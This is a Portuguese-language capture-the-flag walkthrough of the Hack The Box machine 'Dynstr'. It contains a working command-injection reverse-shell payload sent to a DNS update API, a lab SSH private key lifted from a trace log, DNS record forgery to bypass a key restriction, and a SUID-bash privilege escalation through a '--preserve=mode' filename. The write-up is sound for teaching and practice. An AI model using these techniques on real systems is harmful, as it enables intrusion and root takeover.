---
layout: single
title: "Walktrough: HTB Dynstr"
namespace: htb-dynstr
category: Walkthrough
tags:
  - HackTheBox
  - HTB Medium
  - HTB Linux
date: 2021-10-16 16:00:00
header:
  teaser: https://i.imgur.com/89b1SdH.png
  og_image: *teaser
---

Olá pessoal!

A máquina desta semana será **Dynstr**, outra máquina Linux classificada como mediana do [Hack The Box](https://www.hackthebox.eu/), criada por [jkr](https://app.hackthebox.eu/users/77141).<!--more-->

:information_source: **Info**: Write-ups para máquinas do Hack The Box são postados assim que as máquinas são aposentadas.
{: .notice--info}

![HTB Dynstr](https://i.imgur.com/kqW8fwk.png){: .align-center}

Tive a oportunidade de aprender muito com esta máquina! Primeiro enquanto brincava com alguns dicionários de code injection e depois para entender o funcionamento do utilitário `nsupdate`. Após obter execução de código e um shell reverso, encontrei uma chave privada RSA a ser utilizada em uma conexão SSH porém precisei contornar algumas restrições presentes no arquivo `authorized_keys` e, a partir desta outra conta, pude obter a credencial de `root` utilizando de globbing durante a escalação de privilégio.

Espero que gostem!

## Enumeração

Como de costume, iniciei a enumeração dos serviços publicados utilizando um scan rápido do `nmap`.

```bash
$ nmap -sC -sV -Pn -oA quick 10.10.10.244
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-11 18:32 -03
Nmap scan report for 10.10.10.244
Host is up (0.072s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 05:7c:5e:b1:83:f9:4f:ae:2f:08:e1:33:ff:f5:83:9e (RSA)
|   256 3f:73:b4:95:72:ca:5e:33:f6:8a:8f:46:cf:43:35:b9 (ECDSA)
|_  256 cc:0a:41:b7:a1:9a:43:da:1b:68:f5:2a:f8:2a:75:2c (ED25519)
53/tcp open  domain  ISC BIND 9.16.1 (Ubuntu Linux)
| dns-nsid:
|_  bind.version: 9.16.1-Ubuntu
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Dyna DNS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.02 seconds
```

Validando o scan inicial, podemos ver um serviço de DNS, assim como um website HTTP publicado. Antes de adentrar na enumeração do DNS, vamos validar que tipo de informação este website pode nos prover.

### 80/TCP - Serviço TTP

Acessando o website, como mencionado no título da página, temos a Dyna DNS company, uma empresa similar ao [No-IP](https://no-ip.com) que permite o registro de entradas em DNS público e sua atualização, simplificando o processo quando não se tem um endereço IP público estático.

![HTB Dynstr - Dyna DNS](https://i.imgur.com/gtdmYDI.jpg){: .align-center}

Embora seja um website que consiste apenas em um single page application, este site foi especialmente útil por conter informações muito interessantes na seção *Our Services*, que foram imprescindíveis durante a resolução desta máquina, além do domínio `dynadns.htb`, utilizado como endereço de e-mail no contato presente no rodapé:

![HTB Dynstr - Dyna DNS Services](https://i.imgur.com/QZvDDXJ.png){: .align-center}

- Provê uma aplicação para registro de DNS que utiliza da mesma API que `no-ip.com`, conforme disponível na documentação pública em [Integrate with No-IP DDNS - API Information (noip.com)](https://www.noip.com/integrate/request).
- Os domínios possíveis de se utilizar com o serviço encontram-se listados, os quais foram incluídos no arquivo hosts local.
- Credenciais para demonstrações foram fornecidas, então podemos começar a brincar com esta API :smile:

#### Interagindo com a API

De acordo com a documentação do No-IP, a API está localizada em `/nic/update` e utiliza autenticação básica, onde um request GET contendo o IP e o hostname a ser atualizado são suficientes para o registro/atualização, conforme exemplo abaixo:

```bash
$ echo -n 'dynadns:sndanyd' | base64
ZHluYWRuczpzbmRhbnlk
$ curl -i -s -k -H $'Authorization: Basic ZHluYWRuczpzbmRhbnlk' "http://10.10.10.244/nic/update?myip=10.10.10.10&hostname=myhostname.no-ip.htb" -v
*   Trying 10.10.10.244:80...
* Connected to 10.10.10.244 (10.10.10.244) port 80 (#0)
> GET /nic/update?myip=10.10.10.10&hostname=myhostname.no-ip.htb HTTP/1.1
> Host: 10.10.10.244
> User-Agent: curl/7.74.0
> Accept: */*
> Authorization: Basic ZHluYWRuczpzbmRhbnlk
>
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
HTTP/1.1 200 OK
< Date: Fri, 13 Aug 2021 21:36:36 GMT
Date: Fri, 13 Aug 2021 21:36:36 GMT
< Server: Apache/2.4.41 (Ubuntu)
Server: Apache/2.4.41 (Ubuntu)
< Content-Length: 18
Content-Length: 18
< Content-Type: text/html; charset=UTF-8
Content-Type: text/html; charset=UTF-8

<
good 10.10.10.10
* Connection #0 to host 10.10.10.244 left intact
```

Enquanto brincava um pouco com a API comecei a receber alguns erros do tipo **wrngdom** quando nenhum dos domínios suportados encontra-se presente, conforme abaixo:

```bash
$ curl -i -s -k -H $'Authorization: Basic ZHluYWRuczpzbmRhbnlk' "http://10.10.10.244/nic/update?myip=10.10.10.10&hostname=;pwd" -v
*   Trying 10.10.10.244:80...
* Connected to 10.10.10.244 (10.10.10.244) port 80 (#0)
> GET /nic/update?myip=10.10.10.10&hostname=;pwd HTTP/1.1
> Host: 10.10.10.244
> User-Agent: curl/7.74.0
> Accept: */*
> Authorization: Basic ZHluYWRuczpzbmRhbnlk
>
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
HTTP/1.1 200 OK
< Date: Fri, 13 Aug 2021 21:38:23 GMT
Date: Fri, 13 Aug 2021 21:38:23 GMT
< Server: Apache/2.4.41 (Ubuntu)
Server: Apache/2.4.41 (Ubuntu)
< Content-Length: 16
Content-Length: 16
< Content-Type: text/html; charset=UTF-8
Content-Type: text/html; charset=UTF-8

<
911 [wrngdom: ]
* Connection #0 to host 10.10.10.244 left intact
```

Buscando por possibilidades de injeção de código, comecei a fazer o fuzzing com um laço simples `while` com o conteúdo do dicionário em `/usr/share/wordlists/wfuzz/Injections/All_attack.txt`, até obter o erro abaixo:

```bash
$ while read p; do
while> curl -i -s -k -H $'Authorization: Basic ZHluYWRuczpzbmRhbnlk' "http://10.10.10.244/nic/update?myip=10.10.10.10&hostname==$p.no-ip.htb" -v
while> done < /usr/share/wordlists/wfuzz/Injections/All_attack.txt

[...]
* Connection #0 to host 10.10.10.244 left intact
*   Trying 10.10.10.244:80...
* Connected to 10.10.10.244 (10.10.10.244) port 80 (#0)
> GET /nic/update?myip=10.10.10.10&hostname=-1.no-ip.htb HTTP/1.1
> Host: 10.10.10.244
> User-Agent: curl/7.74.0
> Accept: */*
> Authorization: Basic ZHluYWRuczpzbmRhbnlk
>
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
HTTP/1.1 200 OK
< Date: Fri, 13 Aug 2021 21:30:11 GMT
Date: Fri, 13 Aug 2021 21:30:11 GMT
< Server: Apache/2.4.41 (Ubuntu)
Server: Apache/2.4.41 (Ubuntu)
< Content-Length: 22
Content-Length: 22
< Content-Type: text/html; charset=UTF-8
Content-Type: text/html; charset=UTF-8

<
911 [nsupdate failed]
```

Uma vez que este menciona que o `nsupdate` falhou com o payload enviado (neste caso `-1.no-ip.htb`), significa que esta API apenas inicializa a execução deste binário de forma não interativa. Após alguma pesquisa, encontrei nesta página [Using the dynamic DNS editor, nsupdate (rtfm-sarl.ch)](https://www.rtfm-sarl.ch/articles/using-nsupdate.html) alguns exemplos de uso que poderiam ser utilizados de modo a obter execução de código no backend, uma vez que este suporta standard input, que pode ser a forma utilizada na automação que atualiza as entradas de DNS nas zonas.

Para provar que isso está correto, fiz um teste simples, encapsulando os comandos que desejava utilizar dentro da estrutura `$()` e validei a entrada de DNS utilizando `dig`, o que retornou sucesso.

![HTB Dynstr - OS Code injection payload](https://i.imgur.com/r5qrIOo.png){: .align-center}

```bash
$ dig @10.10.10.244 mytestsubdomain.no-ip.htb

; <<>> DiG 9.16.15-Debian <<>> @10.10.10.244 mytestsubdomain.no-ip.htb
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 20816
;; flags: qr aa rd; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1
;; WARNING: recursion requested but not available

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
; COOKIE: c46a9e70a58d51c501000000611a665bf50e119ef07ea985 (good)
;; QUESTION SECTION:
;mytestsubdomain.no-ip.htb.     IN      A

;; ANSWER SECTION:
mytestsubdomain.no-ip.htb. 30   IN      A       10.10.10.11

;; Query time: 68 msec
;; SERVER: 10.10.10.244#53(10.10.10.244)
;; WHEN: Mon Aug 16 10:21:33 -03 2021
;; MSG SIZE  rcvd: 98
```

Agora que confirmei que posso obter execução de código desta forma, modifiquei a requisição para iniciar um shell reverso a partir de um payload em base64, de modo a evitar erros de codificação.

```http
GET /nic/update?myip=10.10.10.11&hostname=%24%28%65%63%68%6f%20%63%6d%30%67%4c%33%52%74%63%43%39%6d%4f%32%31%72%5a%6d%6c%6d%62%79%41%76%64%47%31%77%4c%32%59%37%59%32%46%30%49%43%39%30%62%58%41%76%5a%6e%77%76%59%6d%6c%75%4c%33%4e%6f%49%43%31%70%49%44%49%2b%4a%6a%46%38%62%6d%4d%67%4d%54%41%75%4d%54%41%75%4d%54%51%75%4d%54%49%78%49%44%51%30%4e%44%4d%67%50%69%39%30%62%58%41%76%5a%67%3d%3d%20%7c%20%62%61%73%65%36%34%20%2d%64%20%7c%20%62%61%73%68%29.no-ip.htb HTTP/1.1
Host: 10.10.10.244
User-Agent: python-requests/2.25.1
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Authorization: Basic ZHluYWRuczpzbmRhbnlk
```

## User flag

Iniciei a enumeração utilizando a conta `www-data`, padrão para o apache, utilizando o `linpeas.sh`, onde os seguintes itens foram identificados:

- Usuários com console e suas permissões:

  ```plaintext
  uid=0(root) gid=0(root) groups=0(root)
  uid=1000(dyna) gid=1000(dyna) groups=1000(dyna),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),114(lpadmin),115(sambashare)
  uid=1001(bindmgr) gid=1001(bindmgr) groups=1001(bindmgr)
  ```

- Habilidade de listar o conteúdo do diretório de outros usuários, onde podemos ver algumas chaves SSH para a conta `bindmgr`

  ```plaintext
  ╔══════════╣ Files inside others home (limit 20)
  /home/bindmgr/support-case-C62796521/strace-C62796521.txt
  /home/bindmgr/support-case-C62796521/C62796521-debugging.script
  /home/bindmgr/support-case-C62796521/C62796521-debugging.timing
  /home/bindmgr/support-case-C62796521/command-output-C62796521.txt
  /home/bindmgr/user.txt
  /home/bindmgr/.ssh/known_hosts
  /home/bindmgr/.ssh/id_rsa.pub
  /home/bindmgr/.ssh/authorized_keys
  /home/bindmgr/.ssh/id_rsa
  /home/bindmgr/.bashrc
  /home/bindmgr/.bash_logout
  /home/bindmgr/.profile
  /home/dyna/.bashrc
  /home/dyna/.bash_logout
  /home/dyna/.profile
  /home/dyna/.sudo_as_admin_successful
  ```

  Revisando o conteúdo do diretório `/home/bindmgr`, podemos observar o arquivo `user.txt` para o qual não temos direitos de leitura. Neste perfil de usuário existe também uma pasta chamada `support-case-C62796521`, que contém alguns ouputs de debugging/trace de outras tarefas executadas no servidor.

  ```bash
  www-data@dynstr:/var/www$ ls -la /home/bindmgr/
  total 36
  drwxr-xr-x 5 bindmgr bindmgr 4096 Mar 15 20:39 .
  drwxr-xr-x 4 root    root    4096 Mar 15 20:26 ..
  lrwxrwxrwx 1 bindmgr bindmgr    9 Mar 15 20:29 .bash_history -> /dev/null
  -rw-r--r-- 1 bindmgr bindmgr  220 Feb 25  2020 .bash_logout
  -rw-r--r-- 1 bindmgr bindmgr 3771 Feb 25  2020 .bashrc
  drwx------ 2 bindmgr bindmgr 4096 Mar 13 12:09 .cache
  -rw-r--r-- 1 bindmgr bindmgr  807 Feb 25  2020 .profile
  drwxr-xr-x 2 bindmgr bindmgr 4096 Mar 13 12:09 .ssh
  drwxr-xr-x 2 bindmgr bindmgr 4096 Mar 13 14:53 support-case-C62796521
  -r-------- 1 bindmgr bindmgr   33 Aug 16 15:49 user.txt
  www-data@dynstr:/var/www$
  ```

  Após analisar estes arquivos, notei que no `strace-C62796521.txt` temos uma chave privada em texto plano, que foi extraída e salva como `id_rsa`.

  ```plaintext
  [...]
  15123 read(5, "-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn\nNhAAAAAwEAAQAAAQEAxeKZHOy+RGhs+gnMEgsdQas7klAb37HhVANJgY7EoewTwmSCcsl1\n42kuvUhxLultlMRCj1pnZY/1sJqTywPGalR7VXo+2l0Dwx3zx7kQFiPeQJwiOM8u/g8lV3\nHjGnCvzI4UojALjCH3YPVuvuhF0yIPvJDessdot/D2VPJqS+TD/4NogynFeUrpIW5DSP+F\nL6oXil+sOM5ziRJQl/gKCWWDtUHHYwcsJpXotHxr5PibU8EgaKD6/heZXsD3Gn1VysNZdn\nUOLzjapbDdRHKRJDftvJ3ZXJYL5vtupoZuzTTD1VrOMng13Q5T90kndcpyhCQ50IW4XNbX\nCUjxJ+1jgwAAA8g3MHb+NzB2/gAAAAdzc2gtcnNhAAABAQDF4pkc7L5EaGz6CcwSCx1Bqz\nuSUBvfseFUA0mBjsSh7BPCZIJyyXXjaS69SHEu6W2UxEKPWmdlj/WwmpPLA8ZqVHtVej7a\nXQPDHfPHuRAWI95AnCI4zy7+DyVXceMacK/MjhSiMAuMIfdg9W6+6EXTIg+8kN6yx2i38P\nZU8mpL5MP/g2iDKcV5SukhbkNI/4UvqheKX6w4znOJElCX+AoJZYO1QcdjBywmlei0fGvk\n+JtTwSBooPr+F5lewPcafVXKw1l2dQ4vONqlsN1EcpEkN+28ndlclgvm+26mhm7NNMPVWs\n4yeDXdDlP3SSd1ynKEJDnQhbhc1tcJSPEn7WODAAAAAwEAAQAAAQEAmg1KPaZgiUjybcVq\nxTE52YHAoqsSyBbm4Eye0OmgUp5C07cDhvEngZ7E8D6RPoAi+wm+93Ldw8dK8e2k2QtbUD\nPswCKnA8AdyaxruDRuPY422/2w9qD0aHzKCUV0E4VeltSVY54bn0BiIW1whda1ZSTDM31k\nobFz6J8CZidCcUmLuOmnNwZI4A0Va0g9kO54leWkhnbZGYshBhLx1LMixw5Oc3adx3Aj2l\nu291/oBdcnXeaqhiOo5sQ/4wM1h8NQliFRXraymkOV7qkNPPPMPknIAVMQ3KHCJBM0XqtS\nTbCX2irUtaW+Ca6ky54TIyaWNIwZNznoMeLpINn7nUXbgQAAAIB+QqeQO7A3KHtYtTtr6A\nTyk6sAVDCvrVoIhwdAHMXV6cB/Rxu7mPXs8mbCIyiLYveMD3KT7ccMVWnnzMmcpo2vceuE\nBNS+0zkLxL7+vWkdWp/A4EWQgI0gyVh5xWIS0ETBAhwz6RUW5cVkIq6huPqrLhSAkz+dMv\nC79o7j32R2KQAAAIEA8QK44BP50YoWVVmfjvDrdxIRqbnnSNFilg30KAd1iPSaEG/XQZyX\nWv//+lBBeJ9YHlHLczZgfxR6mp4us5BXBUo3Q7bv/djJhcsnWnQA9y9I3V9jyHniK4KvDt\nU96sHx5/UyZSKSPIZ8sjXtuPZUyppMJVynbN/qFWEDNAxholEAAACBANIxP6oCTAg2yYiZ\nb6Vity5Y2kSwcNgNV/E5bVE1i48E7vzYkW7iZ8/5Xm3xyykIQVkJMef6mveI972qx3z8m5\nrlfhko8zl6OtNtayoxUbQJvKKaTmLvfpho2PyE4E34BN+OBAIOvfRxnt2x2SjtW3ojCJoG\njGPLYph+aOFCJ3+TAAAADWJpbmRtZ3JAbm9tZW4BAgMEBQ==\n-----END OPENSSH PRIVATE KEY-----\n", 4096) = 1823
  [...]
  ```

  Quando tentei utilizar esta chave para conectar via SSH com a conta `bindmgr`, recebi um erro. Ao revisar o conteúdo do arquivo `authorized_keys`, notei que temos uma instrução `from` definida, que limita a conexão utilizando a referida chave RSA a um determinado escopo de sistemas, neste caso máquinas com no subdomínio `*.infra.dyna.htb`.

  ```bash
  www-data@dynstr:/tmp$ cat /home/bindmgr/.ssh/authorized_keys
  from="*.infra.dyna.htb" ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDF4pkc7L5EaGz6CcwSCx1BqzuSUBvfseFUA0mBjsSh7BPCZIJyyXXjaS69SHEu6W2UxEKPWmdlj/WwmpPLA8ZqVHtVej7aXQPDHfPHuRAWI95AnCI4zy7+DyVXceMacK/MjhSiMAuMIfdg9W6+6EXTIg+8kN6yx2i38PZU8mpL5MP/g2iDKcV5SukhbkNI/4UvqheKX6w4znOJElCX+AoJZYO1QcdjBywmlei0fGvk+JtTwSBooPr+F5lewPcafVXKw1l2dQ4vONqlsN1EcpEkN+28ndlclgvm+26mhm7NNMPVWs4yeDXdDlP3SSd1ynKEJDnQhbhc1tcJSPEn7WOD bindmgr@nomen
  ```

  Para contornar este ponto, poderíamos alterar o arquivo hosts da máquina, o que não é possível dado privilégios atuais, ou utilizar o `nsupdate` para incluir a entrada desejada no servidor DNS, na zona `infra.dyna.htb`, o que foi tentado a partir do comando que é utilizado pela API, conforme abaixo:

  ```php
  // Update DNS entry
  $cmd = sprintf("server 127.0.0.1\nzone %s\nupdate delete %s.%s\nupdate add %s.%s 30 IN A %s\nsend\n",$d,$h,$d,$h,$d,$myip);
  system('echo "'.$cmd.'" | /usr/bin/nsupdate -t 1 -k /etc/bind/ddns.key',$retval);
  ```

  Com base nisso, utilizei o seguinte comando para adicionar a nossa entrada no referido subdomínio, porém a ação foi recusada.

  ```bash
  www-data@dynstr:/dev/shm$ cat nsupdate
  server 127.0.0.1
  zone dyna.htb
  update delete attacker.infra.dyna.htb
  update add attacker.infra.dyna.htb 30 IN A 10.10.10.10
  send
  www-data@dynstr:/dev/shm$ cat nsupdate | /usr/bin/nsupdate -t 1 -k /etc/bind/ddns.key
  update failed: REFUSED
  ```

  Após alguma pesquisa, encontrei que o status REFUSED poderia ocorrer se utilizasse uma chave inválida e, validando o diretório onde a chave `ddns.key` está localizada, encontrei outros dois arquivos (conforme abaixo) que poderiam ser utilizados, para o qual o `infra.key` retornou o sucesso esperado, embora ainda não tenha conseguido me conectar via SSH

  ```bash
  www-data@dynstr:/dev/shm$ ls -la /etc/bind/*.key
  -rw-r--r-- 1 root bind 100 Mar 15 20:44 /etc/bind/ddns.key
  -rw-r--r-- 1 root bind 101 Mar 15 20:44 /etc/bind/infra.key
  -rw-r----- 1 bind bind 100 Mar 15 20:14 /etc/bind/rndc.key
  ```

  Com algum troubleshooting adicional notei que a partir do servidor DNS era capaz de resolver o nome `attacker.infra.dyna.htb` mas a busca a reversa, a partir do endereço IP não era possível. Para contornar isso, incluí no comando de `nsupdate` as instruções necessárias para também incluir o registro do tipo PTR no DNS. Um ponto crucial que tive que fazer troubleshoot foi que entre as entradas A e PTR **deve existir uma linha em branco**, caso contrário o update falhará.

  ```bash
  www-data@dynstr:/dev/shm$ cat nsupdate
  server 127.0.0.1
  update add attacker.infra.dyna.htb 30 A 10.10.10.10
  send
  
  update add 121.14.10.10.in-addr.arpa 30 PTR attacker.infra.dyna.htb
  send
  www-data@dynstr:/dev/shm$ cat nsupdate | /usr/bin/nsupdate -t 1 -k /etc/bind/infra.key
  www-data@dynstr:/dev/shm$
  ```

  Após os devidos ajustes, fui capaz de me conectar com a conta `bindmgr` via SSH e ler o conteúdo do arquivo `user.txt`

  ```bash
  bindmgr@dynstr:~$ ls -la
  total 36
  drwxr-xr-x 5 bindmgr bindmgr 4096 Mar 15 20:39 .
  drwxr-xr-x 4 root    root    4096 Mar 15 20:26 ..
  lrwxrwxrwx 1 bindmgr bindmgr    9 Mar 15 20:29 .bash_history -> /dev/null
  -rw-r--r-- 1 bindmgr bindmgr  220 Feb 25  2020 .bash_logout
  -rw-r--r-- 1 bindmgr bindmgr 3771 Feb 25  2020 .bashrc
  drwx------ 2 bindmgr bindmgr 4096 Mar 13 12:09 .cache
  -rw-r--r-- 1 bindmgr bindmgr  807 Feb 25  2020 .profile
  drwxr-xr-x 2 bindmgr bindmgr 4096 Mar 13 12:09 .ssh
  drwxr-xr-x 2 bindmgr bindmgr 4096 Mar 13 14:53 support-case-C62796521
  -r-------- 1 bindmgr bindmgr   33 Aug 16 15:49 user.txt
  bindmgr@dynstr:~$ cat use
  cat: use: No such file or directory
  bindmgr@dynstr:~$ cat user.txt
  <redacted>
  ```

## Root flag

Como de costume, antes de dar sequência na enumeração da máquina por outros meios, executei o comando `sudo -l` e tive a grata surpresa de poder executar com privilégios elevados um script:

```bash
bindmgr@dynstr:~$ sudo -l
sudo: unable to resolve host dynstr.dyna.htb: Name or service not known
Matching Defaults entries for bindmgr on dynstr:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User bindmgr may run the following commands on dynstr:
    (ALL) NOPASSWD: /usr/local/bin/bindmgr.sh
bindmgr@dynstr:~
```

Ao validar seu conteúdo, notei que existia uma entrada bastante interessante **na linha 42**, onde o script, executando como `root`, copia o arquivo `.version` e todos os demais existentes no diretório atual (`*`) para $BINDMGR_DIR. Também requer que o arquivo `.version` no diretório atual seja comparado com o previamente existente no servidor.

```bash
# Stage new version of configuration files.
echo "[+] Staging files to $BINDMGR_DIR."
cp .version * /etc/bind/named.bindmgr/
```

Após a primeira execução, notei que o arquivo `.version` foi copiado com os privilégios de `root`, o que poderia nos permitir abusar de arquivos SUID.

```bash
bindmgr@dynstr:/tmp/tmp.UzxayH3IIl$ sudo /usr/local/bin/bindmgr.sh
sudo: unable to resolve host dynstr.dyna.htb: Name or service not known
[+] Running /usr/local/bin/bindmgr.sh to stage new configuration from /tmp/tmp.UzxayH3IIl.
[+] Creating /etc/bind/named.conf.bindmgr file.
[+] Staging files to /etc/bind/named.bindmgr.
cp: cannot stat '*': No such file or directory
[+] Checking staged configuration.
[-] ERROR: The generated configuration is not valid. Please fix following errors:
    /etc/bind/named.conf.bindmgr:2: open: /etc/bind/named.bindmgr/*: file not found
bindmgr@dynstr:/tmp/tmp.UzxayH3IIl$ ls -la /etc/bind/named.bindmgr/
total 12
drwxr-sr-x 2 root bind 4096 Aug 16 18:22 .
drwxr-sr-x 3 root bind 4096 Aug 16 18:22 ..
-rw-r--r-- 1 root bind    2 Aug 16 18:22 .version
```

Revisando a página [cp \| GTFOBins](https://gtfobins.github.io/gtfobins/cp/#suid) para o cenário de SUID, notei que se o `cp` tiver este modo habilitado, poderia ser utilizado para copiar arquivos restritos do sistema, porém como não é o caso, precisaremos de outro meio de abusar do binário `cp` invocado neste script.

Um ponto mencionado na página acima é que podemos utilizar o parâmetro `--preserve` para **preservar os atributos de arquivos** durante a cópia. Adicionar este parâmetro na execução pode ser alcançado graças à uma feature do `bash` chamada **file name expansion**, popularmente conhecida como ***[globbing](https://tldp.org/LDP/abs/html/globbingref.html)*** que **expande** os nomes dos arquivos durante a execução dos comandos. Este comportamento pode ser visto no exemplo abaixo com o comando `echo`:

```bash
bindmgr@dynstr:/tmp/tmp.PdP9Qf49qx$ ls -l
total 0
-rw-rw-r-- 1 bindmgr bindmgr 0 Aug 16 19:15 file.sh
-rw-rw-r-- 1 bindmgr bindmgr 0 Aug 16 19:15 test.txt
bindmgr@dynstr:/tmp/tmp.PdP9Qf49qx$ echo *
file.sh test.txt
```

Isso poderia ser explorado de modo a abusar da execução do `cp`, copiando um arquivo previamente configurado com SUID, permitindo a escalação de privilégios na sequência.

Este comportamento foi alcançado a partir da execução dos seguintes passos:

- Copiado o arquivo `/bin/bash` para um diretório temporário e ajustado o SUID bit, assim como criado um arquivo `.version` contendo uma versão inicial.

  ```bash
  bindmgr@dynstr:/tmp$ cd $(mktemp -d)
  bindmgr@dynstr:/tmp/tmp.7i6oryDsae$ cp /bin/bash .
  bindmgr@dynstr:/tmp/tmp.7i6oryDsae$ chmod u+s bash
  bindmgr@dynstr:/tmp/tmp.7i6oryDsae$ echo 1 > .version
  bindmgr@dynstr:/tmp/tmp.7i6oryDsae$ ls -la
  total 1168
  drwx------  2 bindmgr bindmgr    4096 Aug 16 19:22 .
  drwxrwxrwt 13 root    root       4096 Aug 16 19:22 ..
  -rwsr-xr-x  1 bindmgr bindmgr 1183448 Aug 16 19:22 bash
  -rw-rw-r--  1 bindmgr bindmgr       2 Aug 16 19:22 .version
  ```

- Criado também um arquivo chamado `--preserve=mode`, de forma que seu nome seja interpretado como um parâmetro para a execução do `cp`, copiando o binário `bash`, porém mantendo o SUID configurado. Podemos confirmar este comportamento a partir do comando `echo`, também abaixo:

  ```bash
  bindmgr@dynstr:/tmp/tmp.7i6oryDsae$ echo "" > ./--preserve=mode
  bindmgr@dynstr:/tmp/tmp.7i6oryDsae$ echo *
  bash --preserve=mode
  ```

- Executei o script usando o `sudo`

  ```bash
  bindmgr@dynstr:/tmp/tmp.7i6oryDsae$ sudo /usr/local/bin/bindmgr.sh
  sudo: unable to resolve host dynstr.dyna.htb: Name or service not known
  [+] Running /usr/local/bin/bindmgr.sh to stage new configuration from /tmp/tmp.7i6oryDsae.
  [+] Creating /etc/bind/named.conf.bindmgr file.
  [+] Staging files to /etc/bind/named.bindmgr.
  [+] Checking staged configuration.
  [-] ERROR: The generated configuration is not valid. Please fix following errors:
      /etc/bind/named.bindmgr/bash:1: unknown option 'ELF...'
      /etc/bind/named.bindmgr/bash:14: unknown option 'hȀE'
      /etc/bind/named.bindmgr/bash:40: unknown option 'YF'
      /etc/bind/named.bindmgr/bash:40: unexpected token near '}'
  ```

- Executei o binário `bash` com o parâmetro `-p`, conforme orientado na página [bash \| GTFOBins](https://gtfobins.github.io/gtfobins/bash/#suid), o que me permitiu um shell interativo com a conta `root`, a partir da qual fui capaz de ler o conteúdo do arquivo `/root/root.txt` :smiley:

```bash
bindmgr@dynstr:/tmp/tmp.7i6oryDsae$ /etc/bind/named.bindmgr/bash -p
bash-5.0# ls -la
total 1172
drwx------  2 bindmgr bindmgr    4096 Aug 16 19:10  .
drwxrwxrwt 13 root    root       4096 Aug 16 19:09  ..
-rwsr-xr-x  1 bindmgr bindmgr 1183448 Aug 16 19:10  bash
-rw-rw-r--  1 bindmgr bindmgr       1 Aug 16 19:10 '--preserve=mode'
-rw-rw-r--  1 bindmgr bindmgr       2 Aug 16 19:10  .version
bash-5.0# cd /root
bash-5.0# cat root.txt
<redacted>
```

Espero que tenham gostado!

Vejo vocês no próximo post :smile:
